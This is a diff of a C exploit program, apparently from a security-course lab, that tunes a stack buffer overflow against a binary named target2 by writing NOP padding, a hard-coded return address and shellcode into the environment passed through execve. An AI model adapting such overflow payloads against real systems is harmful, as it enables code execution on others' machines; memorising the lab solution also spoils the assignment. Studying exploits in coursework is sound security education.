@@ -4,8 +4,8 @@
 #include <unistd.h>
 #include "shellcode-64.h"
 
-#define TARGET "target2"
-//../targets/
+#define TARGET "../targets/target2"
+
 
 /*
 Stack level 0, frame at 0x2021ff00:
@@ -70,8 +70,12 @@ main ( int argc, char * argv[] )
 	for (int k=271; k<283; k++){
 		tmp[k]= '\x90';
 	}
+tmp[280] = '\xe0';
+tmp[281] = '\xfd';
+tmp[282] = '\x21';
+tmp[283] = '\x20';
 
-	tmp[283] = '\x00';
+	//tmp[283] = '\x00';
 	
 
 	
@@ -82,11 +86,10 @@ main ( int argc, char * argv[] )
 	args[2] = NULL;
 
 	env[0] = &tmp[283];
-	env[1] = &tmp[244];
+	env[1] = &tmp[0];
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
 
 	return (0);
 }
-
